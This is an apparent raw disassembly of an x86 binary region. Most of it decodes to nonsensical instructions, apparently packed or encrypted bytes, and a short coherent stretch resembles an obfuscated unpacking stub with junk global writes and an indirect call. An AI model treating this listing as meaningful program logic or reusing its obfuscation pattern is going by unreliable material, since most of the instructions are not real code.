  40f263:	in     al,dx
  40f264:	pop    ebp
  40f265:	repz mov al,0xc
  40f268:	test   eax,0xcdfe7099
  40f26d:	shl    DWORD PTR [ebx+0x71],cl
  40f270:	outs   dx,DWORD PTR ds:[esi]
  40f271:	in     al,0x2
  40f273:	push   ebx
  40f274:	mov    ch,0xf9
  40f276:	inc    edi
  40f277:	fild   DWORD PTR [ebp-0x605fb562]
  40f27d:	mov    ebp,0x33564ff2
  40f282:	dec    edx
  40f283:	sub    bl,BYTE PTR [esi]
  40f285:	inc    esi
  40f286:	cmp    al,0xa3
  40f288:	or     DWORD PTR [ecx],edx
  40f28a:	xchg   edi,eax
  40f28b:	lds    ecx,FWORD PTR [eax]
  40f28d:	sbb    DWORD PTR [ebx+ebp*1],ecx
  40f290:	cmc    
  40f291:	data16 jbe 0x40f298
  40f294:	dec    eax
  40f295:	xor    eax,0xb4ce0029
  40f29a:	sbb    BYTE PTR [ebx+0x1707d21f],bl
  40f2a0:	fcomp  QWORD PTR [edx-0x30ca7c7]
  40f2a6:	dec    edi
  40f2a7:	or     eax,0x6ce69001
  40f2ac:	popa   
  40f2ad:	aam    0xef
  40f2af:	jno    0x40f329
  40f2b1:	jae    0x40f2bf
  40f2b3:	mul    ebx
  40f2b5:	inc    esi
  40f2b6:	mov    dl,0xcf
  40f2b8:	dec    eax
  40f2b9:	fimul  WORD PTR [eax-0xf11583b]
  40f2bf:	inc    di
  40f2c1:	fxch   st(0)
  40f2c3:	mov    dh,0x39
  40f2c5:	in     eax,0x8d
  40f2c7:	adc    BYTE PTR [edi+0xa],dl
  40f2ca:	jnp    0x40f280
  40f2cc:	adc    BYTE PTR [ebx+ebx*4+0x3b],dh
  40f2d0:	mov    ds:0x51be83aa,al
  40f2d5:	jl     0x40f2b1
  40f2d7:	enter  0xaea5,0x1b
  40f2db:	fisttp WORD PTR [edi]
  40f2dd:	cmp    BYTE PTR [ebx-0x40bd2a17],0x16
  40f2e4:	jecxz  0x40f2b1
  40f2e6:	pop    ebx
  40f2e7:	repz or DWORD PTR [eax+esi*2+0x7d3abf88],ebp
  40f2ef:	aaa    
  40f2f0:	add    ecx,esp
  40f2f2:	arpl   WORD PTR [eax],sp
  40f2f4:	out    dx,eax
  40f2f5:	jecxz  0x40f28a
  40f2f7:	mov    edi,0x8729bf88
  40f2fc:	sbb    eax,0x92d86dfc
  40f301:	mov    ah,BYTE PTR [ebp+0x34279a18]
  40f307:	sbb    DWORD PTR es:[eax],esi
  40f30a:	push   cs
  40f30b:	jecxz  0x40f2f7
  40f30d:	dec    ebx
  40f30e:	(bad)  
  40f30f:	outs   dx,BYTE PTR ds:[esi]
  40f310:	mov    WORD PTR ds:0x1a82f738,cs
  40f316:	and    al,0x92
  40f318:	jl     0x40f30f
  40f31a:	jne    0x40f2d7
  40f31c:	pop    ss
  40f31d:	dec    esp
  40f31e:	rcl    ch,0x20
  40f321:	push   ecx
  40f322:	sub    ebp,DWORD PTR [esi+0x656da46a]
  40f328:	stos   BYTE PTR es:[edi],al
  40f329:	mov    ebp,ebp
  40f32b:	lods   al,BYTE PTR ds:[esi]
  40f32c:	pop    eax
  40f32d:	xchg   edx,eax
  40f32e:	(bad)  
  40f32f:	jmp    0x20b05b6
  40f334:	es sub eax,0xf001f71
  40f33a:	and    al,BYTE PTR [esi+0x44846184]
  40f340:	xor    BYTE PTR [eax+eax*1-0x3175a5df],ah
  40f347:	mov    cl,0xb4
  40f349:	cmp    DWORD PTR [eax],ecx
  40f34b:	ror    BYTE PTR [ebx],1
  40f34d:	(bad)  [edx]
  40f34f:	or     BYTE PTR [edx],0x65
  40f352:	pop    es
  40f353:	cmp    eax,0x414c0841
  40f358:	arpl   WORD PTR [ecx],sp
  40f35a:	lar    esi,bp
  40f35d:	inc    ebp
  40f35e:	ret    0x154c
  40f361:	dec    edi
  40f362:	and    edx,DWORD PTR [ebx-0x382dab92]
  40f368:	xchg   BYTE PTR [ebp+0x71],cl
  40f36b:	inc    ebp
  40f36c:	xor    cl,BYTE PTR [eax-0x69]
  40f36f:	jge    0x40f305
  40f371:	inc    ebp
  40f372:	leave  
  40f373:	jns    0x40f3d3
  40f375:	sbb    al,bh
  40f377:	fisubr DWORD PTR [ebx-0x275d415a]
  40f37d:	push   eax
  40f37e:	fimul  DWORD PTR [ecx+0xb]
  40f381:	mov    ecx,0x8f711c41
  40f386:	lahf   
  40f387:	mov    esi,0x73c59a4a
  40f38c:	mov    eax,ds:0x6b1b2300
  40f391:	adc    BYTE PTR [esi-0x33f486a8],0x69
  40f398:	test   bh,al
  40f39a:	inc    edi
  40f39b:	clc    
  40f39c:	add    ebx,0xe
  40f39f:	out    dx,al
  40f3a0:	jecxz  0x40f331
  40f3a2:	out    dx,al
  40f3a3:	jp     0x40f3a9
  40f3a5:	mov    edx,0x669ec9dd
  40f3aa:	sbb    edi,DWORD PTR [ebp+0x44d773c1]
  40f3b0:	hlt    
  40f3b1:	ins    DWORD PTR es:[edi],dx
  40f3b2:	xchg   esi,eax
  40f3b3:	xchg   edi,eax
  40f3b4:	mov    ebx,0xa9aebb25
  40f3b9:	leave  
  40f3ba:	loope  0x40f354
  40f3bc:	xchg   ecx,eax
  40f3bd:	rcl    DWORD PTR [ebx],1
  40f3bf:	pusha  
  40f3c0:	mov    edx,0x7fc0d2c9
  40f3c5:	inc    ebx
  40f3c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3c7:	(bad)  
  40f3c9:	lea    esi,[esi+ebp*4-0x51c1f8c]
  40f3d0:	sbb    BYTE PTR [eax+0x61fc43d8],cl
  40f3d6:	std    
  40f3d7:	add    ebp,esi
  40f3d9:	push   0x1263140f
  40f3de:	jge    0x40f3da
  40f3e0:	jl     0x40f427
  40f3e2:	mov    ch,0x58
  40f3e4:	fild   WORD PTR [ecx+ebp*4]
  40f3e7:	test   DWORD PTR [ebp+0x1f93e1d8],ebx
  40f3ed:	jbe    0x40f3a3
  40f3ef:	loop   0x40f443
  40f3f1:	push   cs
  40f3f2:	sub    BYTE PTR [ebp-0x2ccb249d],0x84
  40f3f9:	sbb    edi,esi
  40f3fb:	mov    esi,DWORD PTR [eax]
  40f3fd:	push   edi
  40f3fe:	xchg   esi,eax
  40f3ff:	lods   eax,DWORD PTR ds:[esi]
  40f400:	mov    al,BYTE PTR [edx-0x5e]
  40f403:	mov    dl,0xaf
  40f405:	idiv   BYTE PTR [ebx+0x33c3e93f]
  40f40b:	mov    ebx,DWORD PTR [ebx-0x2e2bc0cc]
  40f411:	dec    esi
  40f412:	xor    al,BYTE PTR [eax-0x50]
  40f415:	xchg   BYTE PTR [edx-0x7b],dl
  40f418:	ja     0x40f40d
  40f41a:	mov    esp,ss
  40f41c:	int3   
  40f41d:	xchg   DWORD PTR [edx+0x6d481fab],ecx
  40f423:	js     0x40f495
  40f425:	test   al,0xca
  40f427:	mov    edx,0x794f9043
  40f42c:	adc    ah,BYTE PTR [ebx+0x14]
  40f42f:	into   
  40f430:	lahf   
  40f431:	add    BYTE PTR [esi-0x38],ch
  40f434:	fidivr WORD PTR [ecx+0x1b]
  40f437:	pop    esp
  40f438:	jo     0x40f3ef
  40f43a:	mov    dh,0x2
  40f43c:	cmp    dl,bh
  40f43e:	push   cs
  40f43f:	repnz jmp 0xe643:0x4b41efb6
  40f447:	pop    eax
  40f448:	cmp    cl,cl
  40f44a:	jo     0x40f3f7
  40f44c:	in     al,0x99
  40f44e:	test   DWORD PTR ss:[eax-0x699237a2],esp
  40f455:	outs   dx,BYTE PTR ds:[esi]
  40f456:	cmp    eax,0x88e20176
  40f45b:	push   edx
  40f45c:	or     eax,edx
  40f45e:	ror    DWORD PTR [ebp-0x6d3bb712],1
  40f464:	test   al,0x55
  40f466:	push   cs
  40f467:	out    0xcb,eax
  40f469:	adc    al,0x36
  40f46b:	xlat   BYTE PTR ds:[ebx]
  40f46c:	and    al,0xc
  40f46e:	retf   
  40f46f:	clc    
  40f470:	test   al,0xf1
  40f472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f473:	int3   
  40f474:	addr16 cld 
  40f476:	adc    al,BYTE PTR [edx-0x73]
  40f479:	bound  eax,QWORD PTR [edx-0x3a]
  40f47c:	daa    
  40f47d:	push   ecx
  40f47e:	pop    eax
  40f47f:	loope  0x40f40e
  40f481:	cmp    bh,BYTE PTR [ebx-0x28]
  40f484:	mov    cl,0xad
  40f486:	cld    
  40f487:	cld    
  40f488:	test   al,0x6e
  40f48a:	mov    esi,0x75a78cc
  40f48f:	call   DWORD PTR [edi-0x57]
  40f492:	jmp    0x40f4ac
  40f494:	inc    ebp
  40f495:	das    
  40f496:	mov    al,ds:0xb14b4c6f
  40f49b:	sbb    eax,DWORD PTR [edi]
  40f49d:	lods   eax,DWORD PTR ds:[esi]
  40f49e:	or     al,0x37
  40f4a0:	jl     0x40f4c4
  40f4a2:	(bad)  
  40f4a3:	push   ss
  40f4a4:	aad    0x86
  40f4a6:	add    edi,ebx
  40f4a8:	jbe    0x40f47e
  40f4aa:	fstp   QWORD PTR [ebp-0x42acd983]
  40f4b0:	or     al,0xe3
  40f4b2:	pop    edx
  40f4b3:	fild   QWORD PTR [eax+0x7b15d36f]
  40f4b9:	mov    cl,0xe7
  40f4bb:	add    ecx,ebp
  40f4bd:	outs   dx,BYTE PTR ds:[esi]
  40f4be:	data16 aaa 
  40f4c0:	dec    edi
  40f4c1:	call   0x1cdd30e9
  40f4c6:	iret   
  40f4c7:	adc    al,0x36
  40f4c9:	sub    eax,0xf4879139
  40f4ce:	pop    edi
  40f4cf:	test   DWORD PTR [eax],ebp
  40f4d1:	jl     0x40f468
  40f4d3:	push   0xe02c1362
  40f4d8:	xlat   BYTE PTR ds:[ebx]
  40f4d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4da:	push   ecx
  40f4db:	icebp  
  40f4dc:	lea    ebp,[ecx-0x59e5385]
  40f4e2:	adc    al,0x94
  40f4e4:	mov    dh,0xea
  40f4e6:	daa    
  40f4e7:	es and eax,0xd4e66eaf
  40f4ed:	push   ecx
  40f4ee:	push   ecx
  40f4ef:	mov    eax,0xf89c8539
  40f4f4:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  40f4fb:	mov    DWORD PTR ds:0x4345fb,0x36a0
  40f505:	push   esi
  40f506:	mov    ecx,DWORD PTR ds:0x43460b
  40f50c:	mov    DWORD PTR [ebp-0x8],eax
  40f50f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f512:	mov    DWORD PTR ds:0x4345d3,0x6a14
  40f51c:	push   edi
  40f51d:	mov    DWORD PTR ds:0x4345ff,0x48b4
  40f527:	mov    edi,0x7510851
  40f52c:	mov    DWORD PTR ds:0x43453f,0x7e06
  40f536:	mov    esi,0x327299
  40f53b:	mov    DWORD PTR ds:0x43458b,0x7203
  40f545:	cmp    ecx,eax
  40f547:	je     0x40fd56
  40f54d:	or     eax,eax
  40f54f:	jmp    0x40f8e2
  40f554:	cmc    
  40f555:	pop    esp
  40f556:	inc    ebp
  40f557:	gs ins DWORD PTR es:[edi],dx
  40f559:	jge    0x40f550
  40f55b:	pop    esp
  40f55c:	push   0xffffffac
  40f55e:	add    ah,BYTE PTR [esi+0x48]
  40f561:	fbstp  TBYTE PTR [esi]
  40f563:	ret    
  40f564:	sahf   
  40f565:	mov    cl,0x7e
  40f567:	jle    0x40f55d
  40f569:	jns    0x40f5e9
  40f56b:	jle    0x40f5df
  40f56d:	xor    dl,bl
  40f56f:	inc    edi
  40f570:	les    edi,FWORD PTR [ebp+0x28]
  40f573:	int3   
  40f574:	mov    cl,0xfd
  40f576:	add    BYTE PTR [ecx-0x5a],0x38
  40f57a:	out    0x65,eax
  40f57c:	mov    ah,0xe0
  40f57e:	cmp    bl,BYTE PTR [esi]
  40f580:	adc    esp,esi
  40f582:	fsubr  DWORD PTR [ebx+0x39]
  40f585:	mov    ebx,0x8df75d96
  40f58a:	arpl   WORD PTR [ebp+0xe],ax
  40f58d:	mov    ch,0xea
  40f58f:	shl    DWORD PTR [ebx],0x89
  40f592:	pop    edi
  40f593:	push   ebp
  40f594:	ret    
  40f595:	mov    dl,0xc2
  40f597:	xchg   ebp,eax
  40f598:	mov    gs,WORD PTR [edx-0x13]
  40f59b:	lahf   
  40f59c:	jb     0x40f5bf
  40f59e:	jae    0x40f5bc
  40f5a0:	sbb    ah,al
  40f5a2:	mov    eax,0x5033282e
  40f5a7:	lock or al,0x38
  40f5aa:	ins    DWORD PTR es:[edi],dx
  40f5ab:	cmp    eax,DWORD PTR [esi+0x906040d]
  40f5b1:	sahf   
  40f5b2:	add    cl,BYTE PTR [eax+0xa]
  40f5b5:	push   ds
  40f5b6:	imul   edx,DWORD PTR [esi+0x1a],0x77d6875d
  40f5bd:	aaa    
  40f5be:	mov    ecx,0x5def741a
  40f5c3:	aad    0x12
  40f5c5:	add    DWORD PTR [ebx+0x20],0xffffffce
  40f5c9:	imul   eax,DWORD PTR [esi],0x5d
  40f5cc:	sahf   
  40f5cd:	or     al,0xf5
  40f5cf:	popa   
  40f5d0:	cmc    
  40f5d1:	test   DWORD PTR [ebx-0x8c275c8],ebx
  40f5d7:	pop    ebp
  40f5d8:	push   edx
  40f5d9:	mov    ecx,0xd60b08d6
  40f5de:	popa   
  40f5df:	es dec eax
  40f5e1:	add    BYTE PTR [eax],cl
  40f5e3:	or     ebx,edx
  40f5e5:	(bad)  
  40f5e6:	mov    edx,0x1d7cfaf5
  40f5eb:	shl    BYTE PTR [ebx+0x11],1
  40f5ee:	sub    al,cl
  40f5f0:	in     eax,dx
  40f5f1:	fcom   DWORD PTR [ebx-0x7acd60cd]
  40f5f7:	push   ds
  40f5f8:	jp     0x40f5e5
  40f5fa:	push   ds
  40f5fb:	sbb    ebx,ebx
  40f5fd:	sub    ebp,DWORD PTR ds:0x87171e28
  40f603:	sub    al,0x6
  40f605:	cmp    ch,dl
  40f607:	retf   0xe708
  40f60a:	mov    esp,0x457f546f
  40f60f:	inc    edi
  40f610:	leave  
  40f611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f612:	mov    esi,0x25cf45e5
  40f617:	mov    edi,0xf9434a8e
  40f61c:	mov    edx,0xfefb40c4
  40f621:	and    eax,0xa8f850ef
  40f627:	push   0xc2a50f3c
  40f62c:	aaa    
  40f62d:	rol    BYTE PTR [ecx+esi*2],0xef
  40f631:	lahf   
  40f632:	pop    ds
  40f633:	icebp  
  40f634:	(bad)  
  40f635:	dec    ebp
  40f636:	dec    esp
  40f637:	mov    al,0x91
  40f639:	in     eax,dx
  40f63a:	or     DWORD PTR [edi+0x15],ebx
  40f63d:	js     0x40f6b5
  40f63f:	mov    edx,0x5581af52
  40f644:	jne    0x40f646
  40f646:	adc    al,0x8b
  40f648:	xlat   BYTE PTR ds:[ebx]
  40f649:	mov    ebp,0x6d8ceca5
  40f64e:	adc    BYTE PTR [edx-0x3f],dh
  40f651:	clc    
  40f652:	pusha  
  40f653:	cmp    ah,ch
  40f655:	jmp    0x40f601
  40f657:	cwde   
  40f658:	jp     0x40f623
  40f65a:	mov    ah,0x95
  40f65c:	fsub   DWORD PTR [edx-0x7e]
  40f65f:	mov    edx,0x2ea30306
  40f664:	xchg   ecx,eax
  40f665:	push   ebp
  40f666:	pop    sp
  40f668:	add    ax,0xe3a
  40f66c:	or     eax,0x474f613a
  40f671:	test   eax,0x2b8855f
  40f676:	mov    al,ds:0xac019b63
  40f67b:	lods   eax,DWORD PTR ds:[esi]
  40f67c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f67d:	mov    ch,0xad
  40f67f:	adc    DWORD PTR [esi+eax*4],eax
  40f682:	push   esi
  40f683:	in     eax,0x9e
  40f685:	add    dh,dh
  40f687:	mov    al,ds:0x46e115fa
  40f68c:	xchg   edx,eax
  40f68d:	mov    edi,0x117234fd
  40f692:	mov    DWORD PTR [eax-0x1505c4bc],ebx
  40f698:	stos   BYTE PTR es:[edi],al
  40f699:	mov    dl,cl
  40f69b:	push   cs
  40f69c:	inc    edx
  40f69d:	add    ebp,edx
  40f69f:	rcr    BYTE PTR [edi+edx*2+0x4f],1
  40f6a3:	xor    DWORD PTR [ebp-0x61c638cb],edi
  40f6a9:	addr16 pop ds
  40f6ab:	dec    esi
  40f6ac:	sub    bh,BYTE PTR [ecx+0x4e]
  40f6af:	loopne 0x40f671
  40f6b1:	mov    al,ds:0x7a51d6dd
  40f6b6:	inc    esp
  40f6b7:	cmp    al,0x2b
  40f6b9:	mov    al,BYTE PTR [eax+0x53a4b100]
  40f6bf:	shl    BYTE PTR [ebx-0x62],1
  40f6c2:	xchg   esp,eax
  40f6c3:	xchg   esi,eax
  40f6c4:	xchg   DWORD PTR [ebp+0x0],ebp
  40f6c7:	jae    0x40f722
  40f6c9:	cld    
  40f6ca:	pop    es
  40f6cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6cc:	ja     0x40f71d
  40f6ce:	sub    al,0xc6
  40f6d0:	and    eax,edx
  40f6d2:	sbb    DWORD PTR [edi+0x73cf302b],esp
  40f6d8:	ss mov dl,dh
  40f6db:	and    dl,BYTE PTR [ebx]
  40f6dd:	mov    ds:0x140eaa2a,eax
  40f6e2:	sub    dh,cl
  40f6e4:	lea    ecx,[ebx]
  40f6e6:	pop    esi
  40f6e7:	dec    edi
  40f6e8:	shl    cl,0xe
  40f6eb:	mov    eax,0x4a6eca63
  40f6f0:	cmp    bh,BYTE PTR [esi+0x742c958b]
  40f6f6:	pop    edx
  40f6f7:	sbb    ecx,DWORD PTR [eax-0x1c]
  40f6fa:	push   ecx
  40f6fb:	ror    DWORD PTR [eax+ebp*2+0x5],1
  40f6ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f700:	pop    esi
  40f701:	jg     0x40f685
  40f703:	and    al,0xa9
  40f705:	xchg   esi,eax
  40f706:	xchg   ebx,eax
  40f707:	daa    
  40f708:	pop    es
  40f709:	mov    al,ds:0xe408fe2a
  40f70e:	pop    ecx
  40f70f:	sub    BYTE PTR [ebp-0x2d9c4dea],bl
  40f715:	sub    esp,DWORD PTR [edi+eax*4-0x4688cdfe]
  40f71c:	(bad)  
  40f71d:	repnz pop ds
  40f71f:	dec    ebp
  40f720:	pop    eax
  40f721:	int    0xed
  40f723:	outs   dx,DWORD PTR ds:[esi]
  40f724:	jecxz  0x40f726
  40f726:	iret   
  40f727:	jmp    0xd819:0x62a4de23
  40f72e:	mov    eax,0x44dca84e
  40f733:	mov    ss,WORD PTR [esi]
  40f735:	xor    al,0xab
  40f737:	arpl   WORD PTR [ecx],bp
  40f739:	jecxz  0x40f764
  40f73b:	sbb    al,0xfe
  40f73d:	push   esi
  40f73e:	call   0xc273:0x428eb701
  40f745:	fwait
  40f746:	sbb    cl,BYTE PTR [edx]
  40f748:	out    dx,al
  40f749:	lds    ecx,FWORD PTR [eax-0x38]
  40f74c:	inc    edi
  40f74d:	pushf  
  40f74e:	imul   edx,DWORD PTR [esi-0x2],0xffffffe0
  40f752:	(bad)  
  40f753:	(bad)  [esi+0x17e4db6b]
  40f759:	out    0xb5,eax
  40f75b:	lock pop esp
  40f75d:	or     DWORD PTR [eax-0x175227e],edi
  40f763:	loope  0x40f70e
  40f765:	adc    bl,BYTE PTR [ecx+0x321399cc]
  40f76b:	jbe    0x40f741
  40f76d:	ret    0x8a5e
  40f770:	jae    0x40f7b0
  40f772:	and    edi,DWORD PTR [esi-0x5ecc9db7]
  40f778:	pop    esp
  40f779:	fwait
  40f77a:	mov    al,0x3e
  40f77c:	sti    
  40f77d:	jns    0x40f787
  40f77f:	or     eax,0xadab24ef
  40f784:	adc    eax,0x3bf7db65
  40f789:	xchg   edx,eax
  40f78a:	(bad)  
  40f78b:	in     al,0x7d
  40f78d:	inc    esp
  40f78e:	inc    edi
  40f78f:	dec    eax
  40f790:	shl    edi,cl
  40f792:	cwde   
  40f793:	mov    BYTE PTR [ecx+ecx*8],ah
  40f796:	and    al,0xe1
  40f798:	add    al,0x13
  40f79a:	mov    eax,0x3dab41cd
  40f79f:	xchg   DWORD PTR [ecx],edx
  40f7a1:	sbb    edi,esp
  40f7a3:	(bad)  
  40f7a4:	ins    BYTE PTR es:[edi],dx
  40f7a5:	pop    es
  40f7a6:	outs   dx,DWORD PTR ds:[esi]
  40f7a7:	and    dh,BYTE PTR [ecx]
  40f7a9:	je     0x40f7ec
  40f7ab:	sub    DWORD PTR [edi+0x6947533c],ebp
  40f7b1:	lock (bad) 
  40f7b3:	pop    ds
  40f7b4:	pop    ds
  40f7b5:	ss push ds
  40f7b7:	aam    0x38
  40f7b9:	fcomip st,st(0)
  40f7bb:	inc    esi
  40f7bc:	sbb    eax,0xcb4ca458
  40f7c1:	retf   
  40f7c2:	ret    0xb8c1
  40f7c5:	cld    
  40f7c6:	dec    ebp
  40f7c7:	ror    edx,0x8d
  40f7ca:	inc    ebx
  40f7cb:	aas    
  40f7cc:	inc    edi
  40f7cd:	test   eax,0xff6ec444
  40f7d2:	jae    0x40f778
  40f7d4:	mov    eax,ds:0x100509ea
  40f7d9:	pop    esp
  40f7da:	cld    
  40f7db:	out    0xdb,eax
  40f7dd:	scas   al,BYTE PTR es:[edi]
  40f7de:	xchg   ecx,eax
  40f7df:	mov    DWORD PTR [esi],esp
  40f7e1:	ss jmp 0x40f7a5
  40f7e4:	sbb    dh,BYTE PTR [eax+0x72]
  40f7e7:	data16 out 0xb0,al
  40f7ea:	and    al,0x9b
  40f7ec:	gs cmp eax,0xa3c71e4
  40f7f2:	test   al,0x82
  40f7f4:	push   0xffffffa8
  40f7f6:	into   
  40f7f7:	out    0x80,al
  40f7f9:	and    al,0x96
  40f7fb:	das    
  40f7fc:	retf   
  40f7fd:	adc    eax,0xb9907863
  40f802:	jg     0x40f7a7
  40f804:	sbb    eax,0xc68fa122
  40f809:	jmp    0xf9827ce2
  40f80e:	rol    BYTE PTR [esi+0x4e],0xe5
  40f812:	pop    es
  40f813:	cwde   
  40f814:	sbb    DWORD PTR [ebp-0x32],ecx
  40f817:	sub    eax,0x11986a13
  40f81c:	xor    eax,0xdfde716a
  40f821:	sub    BYTE PTR [edi],bl
  40f823:	push   ecx
  40f824:	sbb    DWORD PTR [ebx-0xe],edi
  40f827:	push   0xeb4e5037
  40f82c:	out    dx,eax
  40f82d:	jge    0x40f881
  40f82f:	lods   al,BYTE PTR ds:[esi]
  40f830:	fsin   
  40f832:	lds    edi,FWORD PTR [edi]
  40f834:	or     eax,0x3e1aa7e8
  40f839:	add    al,0x5d
  40f83b:	jnp    0x40f819
  40f83d:	pop    ecx
  40f83e:	mov    ch,BYTE PTR [edx+0x79bc721e]
  40f844:	sbb    BYTE PTR [eax-0x61fbb3a0],bl
  40f84a:	cmp    eax,0xe46a9281
  40f84f:	adc    edx,esp
  40f851:	shl    DWORD PTR [edx-0x2cbdbb4b],cl
  40f857:	ds mov ecx,0x3760cade
  40f85d:	bound  esi,QWORD PTR [ebp+0x47841290]
  40f863:	addr16 mov ds:0xb4cd,al
  40f867:	leave  
  40f868:	dec    edi
  40f869:	jmp    0x40f864
  40f86b:	ret    0x8c94
  40f86e:	pop    ebx
  40f86f:	dec    ebx
  40f870:	rcl    BYTE PTR gs:[edx-0x7f],0xdc
  40f875:	inc    esp
  40f876:	sbb    eax,esi
  40f878:	xchg   edx,eax
  40f879:	imul   edi,DWORD PTR [edx+ecx*8],0x34
  40f87d:	mov    fs,WORD PTR [ecx+0x4e]
  40f880:	cmp    al,0x41
  40f882:	fcomp  QWORD PTR [ecx+0x1f]
  40f885:	dec    eax
  40f886:	idiv   DWORD PTR [edi+0x3dd8f6b1]
  40f88c:	xchg   ebp,eax
  40f88d:	es (bad) 
  40f88f:	in     al,dx
  40f890:	xchg   ecx,eax
  40f891:	pop    edx
  40f892:	inc    ebx
  40f893:	bound  ebx,QWORD PTR [eax+eiz*1]
  40f896:	mov    ch,0x39
  40f898:	retf   0x966e
  40f89b:	cdq    
  40f89c:	nop
  40f89d:	test   al,0x90
  40f89f:	ret    0x4cad
  40f8a2:	mul    BYTE PTR [edi+0x21005898]
  40f8a8:	inc    ebx
  40f8a9:	mov    edx,0x878d81b4
  40f8ae:	sbb    ch,bl
  40f8b0:	ret    0x7301
  40f8b3:	push   esp
  40f8b4:	test   BYTE PTR [ebx+eiz*2+0x6f],bl
  40f8b8:	jge    0x40f8ac
  40f8ba:	mov    edx,0x9749f9a7
  40f8bf:	fsub   DWORD PTR [esi]
  40f8c1:	mov    ebp,0xe309daeb
  40f8c6:	pushf  
  40f8c7:	dec    edi
  40f8c8:	(bad)  [ebp-0x18]
  40f8cb:	jle    0x40f919
  40f8cd:	mov    eax,ebx
  40f8cf:	(bad)  
  40f8d0:	iret   
  40f8d1:	out    0x95,eax
  40f8d3:	shl    BYTE PTR [edi+eax*8],cl
  40f8d6:	ret    
  40f8d7:	arpl   ax,dx
  40f8d9:	test   al,0xee
  40f8db:	inc    esp
  40f8dc:	jp     0x40f88f
  40f8de:	xchg   BYTE PTR [esi+0x66],ch
  40f8e1:	and    ecx,DWORD PTR [ebx+0x4d8bfc45]
  40f8e7:	or     al,0x81
  40f8e9:	xor    eax,0x43453f
  40f8ee:	iret   
  40f8ef:	inc    ebp
  40f8f0:	inc    ebx
  40f8f1:	add    BYTE PTR [ebx],dh
  40f8f3:	mov    DWORD PTR [ebx],0x8b05c7c6
  40f8f9:	inc    ebp
  40f8fa:	inc    ebx
  40f8fb:	add    BYTE PTR [ebx+0x3b00004b],ch
  40f901:	rol    edi,0x5
  40f904:	cmovbe eax,DWORD PTR [ebx+0x0]
  40f908:	push   ebx
  40f909:	add    BYTE PTR ds:[eax],al
  40f90c:	je     0x40fd56
  40f912:	and    DWORD PTR ds:0x434593,edi
  40f918:	mov    eax,DWORD PTR [ebp-0x4]
  40f91b:	mov    edx,DWORD PTR ds:0x4344eb
  40f921:	xor    DWORD PTR ds:0x434553,edx
  40f927:	xor    eax,edi
  40f929:	and    DWORD PTR ds:0x4345bf,0x0
  40f933:	mov    edx,DWORD PTR ds:0x4345bf
  40f939:	inc    edx
  40f93a:	mov    DWORD PTR ds:0x4345bf,edx
  40f940:	cmp    DWORD PTR ds:0x4345bf,0x9
  40f947:	jne    0x40f96a
  40f94d:	push   0x43454b
  40f952:	push   0x434692
  40f957:	push   0x7b5f
  40f95c:	push   0x5aad
  40f961:	push   DWORD PTR [ebp-0xc]
  40f964:	call   DWORD PTR ds:0x4132a4
  40f96a:	cmp    DWORD PTR ds:0x4345bf,0x8
  40f971:	jne    0x40f986
  40f977:	xor    edx,edx
  40f979:	xor    edx,DWORD PTR ds:0x4345bf
  40f97f:	inc    edx
  40f980:	mov    DWORD PTR ds:0x4345bf,edx
  40f986:	cmp    DWORD PTR ds:0x4345bf,0x10
  40f98d:	jb     0x40f933
  40f993:	and    DWORD PTR ds:0x4345bf,edx
  40f999:	add    eax,esi
  40f99b:	push   eax
  40f99c:	push   DWORD PTR [ebp-0x8]
  40f99f:	push   DWORD PTR [ebp-0x4]
  40f9a2:	mov    edx,DWORD PTR ds:0x414afe
  40f9a8:	jmp    0x40fd3b
  40f9ad:	pop    ebx
  40f9ae:	pop    edi
  40f9af:	cld    
  40f9b0:	sub    edi,esp
  40f9b2:	mov    ebp,0x81a66f6d
  40f9b7:	push   esi
  40f9b8:	in     eax,dx
  40f9b9:	fs pop ebx
  40f9bb:	mov    ch,0x2d
  40f9bd:	adc    al,0xbd
  40f9bf:	jle    0x40fa3f
  40f9c1:	hlt    
  40f9c2:	jns    0x40fa42
  40f9c4:	jle    0x40fa2c
  40f9c6:	cmc    
  40f9c7:	and    eax,DWORD PTR [eax+0x7370b380]
  40f9cd:	jmp    0x40f95e
  40f9cf:	retf   
  40f9d0:	mov    bl,0x55
  40f9d2:	mov    WORD PTR [ecx],ss
  40f9d4:	cwde   
  40f9d5:	in     al,dx
  40f9d6:	cmp    DWORD PTR [eax+0x75826642],edi
  40f9dc:	jbe    0x40f9ae
  40f9de:	(bad)  
  40f9df:	pop    edx
  40f9e0:	iret   
  40f9e1:	jae    0x40f9d5
  40f9e3:	add    eax,0xd6f0e5a1
  40f9e8:	cs adc al,0x47
  40f9eb:	(bad)  
  40f9ec:	out    dx,eax
  40f9ed:	jge    0x40fa09
  40f9ef:	cld    
  40f9f0:	add    al,ch
  40f9f2:	(bad)  
  40f9f3:	jmp    0xe9ef:0x8aaaf49d
  40f9fa:	sbb    edi,DWORD PTR [ebp-0x3992abd7]
  40fa00:	jl     0x40fa4f
  40fa02:	loop   0x40fa1e
  40fa04:	mov    esi,0x4c7dd954
  40fa09:	pop    ebx
  40fa0a:	add    DWORD PTR es:[ebp-0x678ebdec],0x5a
  40fa12:	adc    BYTE PTR [edx],dl
  40fa14:	in     eax,dx
  40fa15:	sbb    BYTE PTR [ecx+0x26561c27],bl
  40fa1b:	cmovns ecx,DWORD PTR ds:0x3c2f6796
  40fa22:	ins    DWORD PTR es:[edi],dx
  40fa23:	test   BYTE PTR [edi],al
  40fa25:	(bad)  
  40fa26:	rcr    cl,cl
  40fa28:	cmp    dh,dh
  40fa2a:	ret    0x93bf
  40fa2d:	or     eax,ebp
  40fa2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa30:	push   eax
  40fa31:	das    
  40fa32:	gs or  dh,bh
  40fa35:	or     eax,0xfc68c044
  40fa3a:	jg     0x40fab1
  40fa3c:	call   0xb8e36415
  40fa41:	ins    BYTE PTR es:[edi],dx
  40fa42:	and    BYTE PTR es:[ebx],bh
  40fa45:	les    ecx,FWORD PTR [edx+ecx*8+0x5]
  40fa49:	inc    edi
  40fa4a:	mov    ebx,0xc3379cc9
